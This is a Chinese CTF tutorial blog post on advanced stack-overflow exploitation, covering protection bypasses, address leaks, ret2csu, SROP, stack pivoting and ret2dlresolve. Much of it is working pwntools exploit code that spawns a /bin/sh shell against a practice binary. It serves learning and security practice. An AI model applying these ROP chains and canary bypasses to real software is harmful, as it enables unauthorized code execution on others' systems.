---
title: Pwn讲解—栈溢出高级利用技术与ROP链构造
date: 2026-09-12 18:00:00
categories: [CTF, Pwn]
tags: [CTF, Pwn, ROP]
cover: https://cdn.jsdelivr.net/gh/TSVMV/TSVMV.github.io@main/source/img/bg12.jpg
---

## 栈溢出的进阶视角

基础栈溢出（ret2text、ret2shellcode、ret2libc）是 Pwn 的入门内容。高级栈溢出关注的是：在严格的保护机制（NX、ASLR、PIE、RELRO、Canary）下，如何构造复杂的利用链；以及各种高级 ROP 技术（ret2csu、SROP、ret2reg、stack pivot）的原理和应用。

本文假设读者已经掌握基础栈溢出原理，重点讲解高级利用技术。

<!-- more -->

## 保护机制与绕过策略

| 保护机制 | 作用 | 绕过方法 |
|----------|------|----------|
| NX/DEP | 栈不可执行 | ROP、ret2libc |
| ASLR | 地址随机化 | 泄露地址（puts/printf 泄露 GOT） |
| PIE | 程序基址随机化 | 泄露程序地址（partial overwrite、格式化字符串） |
| Stack Canary | 栈溢出检测 | 泄露 canary、格式化字符串、tls 劫持 |
| RELRO | GOT 表只读 | ret2dlresolve、largebin attack（堆） |
| Full RELRO | GOT 完全只读 | 只能用 ROP，不能改 GOT |

高级栈溢出题通常同时开启多种保护，需要组合多种技术。

## 地址泄露技术

ASLR 和 PIE 开启时，需要先泄露地址才能构造 ROP 链。

### 1. puts/printf 泄露 GOT

最基础的泄露方法：调用 `puts(got_addr)` 打印 GOT 表中函数的真实地址，然后计算 libc 基址。

```python
from pwn import *

context(arch='amd64', os='linux')
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 构造 ROP：puts(puts@got) → 回到 main
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x40101a       # ret（栈对齐）

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])  # 回到 main，进行第二次溢出

p.sendline(payload)
p.recvline()
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.sym['puts']
log.success(f'libc_base = {hex(libc_base)}')

# 第二次溢出：system("/bin/sh")
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * 40
payload += p64(ret)          # 栈对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

### 2. 格式化字符串泄露

如果程序有格式化字符串漏洞（`printf(user_input)`），可以泄露栈上的任意数据，包括 canary、返回地址、libc 地址等。

```python
# 泄露 canary（假设 canary 在栈上的偏移是 %15$p）
p.sendline(b'%15$p')
canary = int(p.recvline(), 16)
log.success(f'canary = {hex(canary)}')

# 泄露 libc 地址（__libc_start_main+240 在栈上）
p.sendline(b'%17$p')
libc_start_main = int(p.recvline(), 16) - 240
libc_base = libc_start_main - libc.sym['__libc_start_main']
```

### 3. Partial Overwrite（部分覆盖）

当 PIE 开启时，程序基址的低 12 位（页内偏移）是固定的。可以只覆盖返回地址的低 2-3 字节，跳转到程序中的某个 gadget，不需要泄露完整地址。

```python
# 只覆盖返回地址的低 2 字节，跳转到程序中的 win 函数
# win 函数的低 12 位是固定的（如 0x1234）
payload = b'A' * 40
payload += p16(0x1234)  # 只写低 2 字节
```

Partial overwrite 的成功率取决于地址的低字节是否固定。ASLR 的粒度是页（4KB），所以低 12 位固定，低 13-16 位有 1/16 的概率。

## Canary 绕过技术

### 1. 泄露 Canary

最直接的方法：用格式化字符串或逐字节爆破泄露 canary。

```python
# 逐字节爆破 canary（64 位 canary 是 8 字节，最低字节固定为 0x00）
canary = b'\x00'
for i in range(7):
    for byte in range(256):
        payload = b'A' * 40 + canary + bytes([byte])
        p.sendline(payload)
        if b'Segmentation fault' not in p.recvline():
            canary += bytes([byte])
            break
```

### 2. TLS 劫持（Canary 绕过的高级方法）

Canary 的值存储在 TLS（Thread Local Storage）中，通过 `fs:0x28`（64 位）或 `gs:0x14`（32 位）访问。如果可以任意写，可以修改 TLS 中的 canary 值，让检查通过。

```python
# 用格式化字符串任意写，修改 TLS 中的 canary
# fs:0x28 的地址可以通过 %fs 寄存器或 arch_prctl 获取
```

### 3. 覆盖 __stack_chk_fail 的 GOT

如果开启了 Partial RELRO（GOT 可写），可以覆盖 `__stack_chk_fail` 的 GOT 为一个 gadget，让 canary 检查失败时跳转到我们控制的地址。

```python
# 用格式化字符串或任意写，把 __stack_chk_fail@got 改成 pop rdi; ret
# 这样 canary 检查失败时，不会崩溃，而是执行我们的 gadget
```

## 高级 ROP 技术

### 1. ret2csu（通用 gadget）

64 位程序中，`__libc_csu_init` 函数中包含一组通用的 gadget，可以用来设置任意寄存器（rdi、rsi、rdx），这在没有足够 gadget 时非常有用。

`__libc_csu_init` 中的关键 gadget：

```asm
# gadget 1（csu_gadget_1）：
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

# gadget 2（csu_gadget_2）：
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword ptr [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jnz csu_gadget_2
# 然后继续执行 csu_gadget_1
```

利用 ret2csu 调用任意函数（设置 rdi、rsi、rdx 三个参数）：

```python
def ret2csu(csu_gadget_1, csu_gadget_2, rdi, rsi, rdx, func_addr):
    """
    构造 ret2csu 链，调用 func_addr(rdi, rsi, rdx)
    """
    payload = b''
    # csu_gadget_1：设置 rbx=0, rbp=1, r12=func_addr, r13=rdi, r14=rsi, r15=rdx
    payload += p64(csu_gadget_1)
    payload += p64(0)          # rbx = 0
    payload += p64(1)          # rbp = 1（让 jnz 不跳转）
    payload += p64(func_addr)  # r12 = 函数地址（call [r12+rbx*8] = call [r12]）
    payload += p64(rdi)        # r13 = rdi
    payload += p64(rsi)        # r14 = rsi
    payload += p64(rdx)        # r15 = rdx
    # csu_gadget_2：设置寄存器并调用函数
    payload += p64(csu_gadget_2)
    # 调用后，csu_gadget_2 会继续执行 csu_gadget_1，需要填充 7 个 8 字节
    payload += b'A' * 56       # 7 * 8 = 56 字节填充
    return payload
```

ret2csu 的限制：
- 只能设置 rdi、rsi、rdx（前三个参数）
- 调用的函数地址必须在 r12 指向的内存中（通常是 GOT 表中的函数）
- 调用后会继续执行 csu_gadget_1，需要填充栈

### 2. SROP（Sigreturn Oriented Programming）

SROP 利用 `sigreturn` 系统调用来设置所有寄存器。当程序中有 `syscall; ret` gadget 时，可以构造一个 sigreturn 帧，设置所有寄存器（包括 rip、rsp、rax、rbx、rcx、rdx、rsi、rdi、r8-r15 等）。

SROP 的优势：
- 只需要一个 `syscall; ret` gadget
- 可以一次设置所有寄存器
- 可以直接设置 rip 到任意地址

```python
from pwn import *

context(arch='amd64', os='linux')

# 构造 sigreturn 帧
frame = SigreturnFrame()
frame.rax = 59          # execve 系统调用号
frame.rdi = binsh_addr  # "/bin/sh" 地址
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr  # syscall; ret gadget 的地址

# payload：溢出 → 设置 rax=15（sigreturn 调用号）→ syscall → sigreturn 帧
payload = b'A' * 40
payload += p64(pop_rax)      # pop rax; ret
payload += p64(15)           # rax = 15（rt_sigreturn）
payload += p64(syscall_addr) # syscall; ret
payload += bytes(frame)      # sigreturn 帧
```

SROP 的限制：
- 需要 `syscall; ret` gadget
- 需要知道 `/bin/sh` 的地址（或用 read 写入）
- sigreturn 帧较大（248 字节），需要足够的溢出空间

### 3. ret2reg（返回到寄存器）

当寄存器中存储了我们控制的数据的地址时，可以直接跳转到寄存器指向的代码。常见的 ret2reg：

- **ret2rax**：跳转到 rax 指向的地址（rax 通常是函数返回值）
- **ret2rsp**：跳转到 rsp 指向的地址（栈顶）
- **ret2rdi/rsi/rdx**：跳转到参数寄存器指向的地址

```python
# ret2rsp：jmp rsp gadget
jmp_rsp = 0x401234
shellcode = asm(shellcraft.sh())

payload = b'A' * 40
payload += p64(jmp_rsp)   # jmp rsp
payload += shellcode       # 栈上的 shellcode（需要栈可执行）
```

### 4. Stack Pivot（栈迁移）

当溢出空间不足以构造完整的 ROP 链时，可以把栈迁移到另一个我们控制的区域（如 bss 段、堆、可读可写的内存）。

Stack pivot 的核心 gadget：`leave; ret`

```asm
leave:
    mov rsp, rbp
    pop rbp
ret:
    pop rip
```

利用 `leave; ret` 进行栈迁移：

```python
# 假设我们在 bss 段构造了一个假栈
fake_stack = 0x602000 + 0x800  # bss 段中的地址

# 第一次溢出：设置 rbp = fake_stack，然后 leave; ret
payload = b'A' * 32              # 填充到 rbp
payload += p64(fake_stack)       # rbp = fake_stack
payload += p64(leave_ret)        # leave; ret
# leave 执行：rsp = fake_stack, pop rbp（从 fake_stack 弹出）
# ret 执行：从 fake_stack+8 弹出 rip
```

在 fake_stack 处预先构造完整的 ROP 链，`leave; ret` 后就会执行这个 ROP 链。

Stack pivot 常用于：
- 溢出空间不足（只能覆盖 rbp 和返回地址）
- 需要构造复杂的 ROP 链（ret2csu、SROP）
- 格式化字符串漏洞中迁移栈

### 5. ret2dlresolve（延迟绑定绕过）

当 Full RELRO 关闭时，可以利用动态链接器的延迟绑定机制，让程序解析一个不存在的函数名，从而执行任意函数。不需要泄露 libc 地址。

原理：
1. PLT 中的代码会跳转到 `_dl_runtime_resolve`
2. `_dl_runtime_resolve` 根据 reloc 索引和符号索引解析函数地址
3. 我们可以伪造 reloc 和符号结构，让解析器解析我们指定的函数（如 system）

ret2dlresolve 比较复杂，通常用 pwntools 的 `Ret2dlresolve` 类自动构造：

```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./vuln')

# 构造 ret2dlresolve
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.ret2dlresolve(dlresolve)

payload = b'A' * 40 + rop.chain()
# 还需要把 dlresolve 的数据写入到指定地址
```

## 64 位 vs 32 位的差异

### 64 位（x86-64）

- 参数通过寄存器传递（rdi, rsi, rdx, rcx, r8, r9）
- 需要 pop rdi 等 gadget 来设置参数
- ret2csu 是设置多参数的常用方法
- 栈对齐：调用 system 前需要 ret gadget 对齐 16 字节
- 地址 8 字节，溢出空间需求更大

### 32 位（x86）

- 参数通过栈传递，直接在返回地址后布置参数
- 不需要 pop 寄存器的 gadget
- 利用更简单：`payload = padding + system_addr + fake_return + arg1 + arg2`
- 地址 4 字节，溢出空间需求小

## 实战：Full RELRO + PIE + Canary 的栈溢出

这是一个典型的高级栈溢出场景，所有保护都开启。

### 利用思路

1. **泄露 Canary**：用格式化字符串或逐字节爆破
2. **泄露 PIE 基址**：用格式化字符串泄露栈上的返回地址，计算程序基址
3. **泄露 libc 基址**：用 printf/puts 泄露 GOT 表（Full RELRO 下 GOT 只读，但可以读）
4. **构造 ROP 链**：用 ret2csu 或已知 gadget 调用 system("/bin/sh")

### 完整 exploit 框架

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 步骤 1：泄露 canary 和 PIE 基址（假设有格式化字符串漏洞）
p.sendline(b'%15$p.%17$p')
leaked = p.recvline().split(b'.')
canary = int(leaked[0], 16)
pie_leak = int(leaked[1], 16)
pie_base = pie_leak - elf.sym['__libc_csu_init'] - 240  # 根据实际偏移调整
elf.address = pie_base
log.success(f'canary = {hex(canary)}')
log.success(f'pie_base = {hex(pie_base)}')

# 步骤 2：泄露 libc 基址（用 printf 泄露 puts@got）
pop_rdi = pie_base + 0x1234  # 根据实际 gadget 调整
ret = pie_base + 0x101a
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

payload = b'A' * 40
payload += p64(canary)
payload += b'B' * 8           # rbp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
p.recvline()
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - libc.sym['puts']
log.success(f'libc_base = {hex(libc_base)}')

# 步骤 3：构造最终 ROP 链
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * 40
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)           # 栈对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

## 调试技巧

### pwndbg 高级命令

```bash
# 查看 canary
gdb-pwndbg> canary

# 查看所有 gadget
gdb-pwndbg> rop --grep "pop rdi"

# 查看 TLS 中的 canary
gdb-pwndbg> p/x $fs_base
gdb-pwndbg> x/gx $fs_base+0x28

# 查看 GOT 表
gdb-pwndbg> got

# 查看函数反汇编
gdb-pwndbg> disassemble main

# 查看栈布局
gdb-pwndbg> telescope $rsp 30

# 条件断点（canary 被修改时断下）
gdb-pwndbg> watch *(long*)($rbp-8)
```

### 动态泄露地址

```python
# 在 gdb 中查看 libc 基址
gdb-pwndbg> vmmap libc
# 0x7ffff7a00000 0x7ffff7a28000 r--p 28000 0 /usr/lib/x86_64-linux-gnu/libc.so.6

# 查看程序基址（PIE）
gdb-pwndbg> vmmap vuln
# 0x555555554000 0x555555555000 r--p 1000 0 /home/user/vuln
```

## 常见坑

1. **栈对齐**：64 位下调用 system 前需要 `ret` gadget 做 16 字节栈对齐，否则会段错误（movaps 指令）
2. **Canary 最低字节**：Canary 的最低字节固定为 0x00（防止字符串函数泄露），爆破时从第 2 字节开始
3. **ret2csu 的 rbp 设置**：rbp 必须设为 1，否则 `cmp rbp, rbx; jnz` 会跳回，导致无限循环
4. **SROP 的 sigreturn 帧**：必须设置正确的 `__reserved` 字段，否则 sigreturn 会失败
5. **Full RELRO 下不能改 GOT**：只能用 ROP，不能用 ret2dlresolve（需要 Partial RELRO）
6. **PIE 下 gadget 地址**：所有 gadget 地址都要加上程序基址，泄露基址后才能计算

## 总结

高级栈溢出的核心是**在多种保护机制的组合下，构造复杂的利用链**。从基础的地址泄露，到 Canary 绕过，再到 ret2csu、SROP、Stack Pivot、ret2dlresolve 等高级 ROP 技术，每一种技术都是在特定限制下的解决方案。

掌握高级栈溢出需要：
1. **深入理解 x86 汇编和调用约定**：寄存器、栈布局、系统调用
2. **熟练使用 ROPgadget 和 pwntools**：快速找到和构造 gadget
3. **理解各种保护机制的原理**：知道每种保护限制了什么，才能找到绕过方法
4. **耐心调试**：高级利用链通常需要多次调试才能成功
5. **积累经验**：不同的题目有不同的限制，经验丰富才能快速选择合适的技术

栈溢出是 Pwn 的基石，掌握高级栈溢出技术后，再去学堆利用、内核 pwn、浏览器 pwn 等更复杂的方向时，思路会清晰很多。
